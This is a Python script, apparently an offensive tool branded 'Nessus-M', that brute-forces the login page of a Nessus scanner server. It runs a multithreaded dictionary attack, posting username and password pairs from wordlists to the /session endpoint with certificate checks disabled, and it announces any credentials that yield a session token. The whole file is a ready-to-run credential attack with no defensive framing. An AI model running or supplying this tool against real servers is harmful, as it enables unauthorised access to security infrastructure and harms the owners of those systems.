#!/bin/python3


import requests
import json
import argparse
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

logo='''
 /$$   /$$                                                         /$$      /$$
| $$$ | $$                                                        | $$$    /$$$
| $$$$| $$  /$$$$$$   /$$$$$$$ /$$$$$$$ /$$   /$$  /$$$$$$$       | $$$$  /$$$$
| $$ $$ $$ /$$__  $$ /$$_____//$$_____/| $$  | $$ /$$_____//$$$$$$| $$ $$/$$ $$
| $$  $$$$| $$$$$$$$|  $$$$$$|  $$$$$$ | $$  | $$|  $$$$$$|______/| $$  $$$| $$
| $$\  $$$| $$_____/ \____  $$\____  $$| $$  | $$ \____  $$       | $$\  $ | $$
| $$ \  $$|  $$$$$$$ /$$$$$$$//$$$$$$$/|  $$$$$$/ /$$$$$$$/       | $$ \/  | $$
|__/  \__/ \_______/|_______/|_______/  \______/ |_______/        |__/     |__/
                Github==>https://github.com/MartinxMax
                S-H4CK13@Мартин. Nessus-M'''

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description='Brute-force Nessus login.')
parser.add_argument('ip', type=str, help='IP address of the Nessus server')
parser.add_argument('port', type=int, help='Port number of the Nessus server')
parser.add_argument('username_file', type=str, help='Path to the username dictionary file')
parser.add_argument('password_file', type=str, help='Path to the password dictionary file')
parser.add_argument('--threads', type=int, default=10, help='Number of threads to use')
parser.add_argument('--protocol', type=str, choices=['http', 'https'], default='https', help='Protocol to use (http or https)')
args = parser.parse_args()

url = f"{args.protocol}://{args.ip}:{args.port}/session"

found_valid_credentials = False

def try_login(username, password):
    global found_valid_credentials
    if found_valid_credentials:
        return

    payload = {
        "username": username,
        "password": password
    }

    response = requests.post(url, headers={"Content-Type": "application/json"}, data=json.dumps(payload), verify=False)

    if response.status_code == 200:
        if "token" in response.json():
            print(Fore.GREEN + f"\n[+] Found valid credentials: {username}:{password}" + Style.RESET_ALL)
            found_valid_credentials = True
            return True
    return False

def display_spinner():
    spinner = ['|', '/', '-', '\\']
    while not found_valid_credentials:
        for symbol in spinner:
            print(f"\r{Fore.YELLOW}[*] Trying passwords... {symbol} {Style.RESET_ALL}", end='')
            time.sleep(0.1)

def main():
    with open(args.username_file, "r", encoding="latin1") as uf:
        users = [line.strip() for line in uf]

    with open(args.password_file, "r", encoding="latin1") as pf:
        passwords = [line.strip() for line in pf]

    total_combinations = len(users) * len(passwords)
    print(Fore.CYAN + f"[*] Total combinations to try: {total_combinations}" + Style.RESET_ALL)

    spinner_thread = ThreadPoolExecutor(max_workers=1).submit(display_spinner)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for username in users:
            for password in passwords:
                futures.append(executor.submit(try_login, username, password))
                if found_valid_credentials:
                    break
            if found_valid_credentials:
                break

        for future in as_completed(futures):
            if found_valid_credentials:
                break

    spinner_thread.cancel()
    print("\r" + " " * 50, end='\r')

if __name__ == "__main__":
    print(logo)
    main()
